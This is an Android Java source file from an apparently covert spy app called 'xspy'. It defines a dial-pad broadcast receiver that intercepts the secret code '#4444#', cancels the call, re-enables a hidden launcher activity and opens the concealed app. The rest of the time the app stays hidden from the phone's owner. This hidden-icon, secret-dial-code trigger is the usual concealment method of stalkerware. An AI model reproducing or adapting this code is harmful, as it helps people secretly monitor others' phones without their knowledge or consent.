package com.redeyesncode.xspy.backend.recievers;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

import com.redeyesncode.xspy.MainActivity;

public class DialPadReceiver extends BroadcastReceiver {


    private String SPY_CODE = "#4444#";
    private String dialedNumber;

    @Override
    public void onReceive(Context context, Intent intent) {

        // Get the dialpad code in here not outside.
        dialedNumber = getResultData();
        if (dialedNumber!=null &&dialedNumber.equals(SPY_CODE)){
            // My app will bring up, so cancel the dialer broadcast
            setResultData(null);
            PackageManager packageManager = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            //Intent to launch MainActivity
            Intent intent_to_mainActivity = new Intent(context, MainActivity.class);
            context.startActivity(intent_to_mainActivity);

        }else{
            Log.i("DEV_XSPY--->", "DIAL_PAD_RECEIVER IS NULL");
            Log.i("DEV_XSPY--->", "DIAL_PAD_RECEIVER IS NULL");
            Log.i("DEV_XSPY--->", "DIAL_PAD_RECEIVER IS NULL");
            Log.i("DEV_XSPY--->", "DIAL_PAD_RECEIVER IS NULL");
        }

    }
}
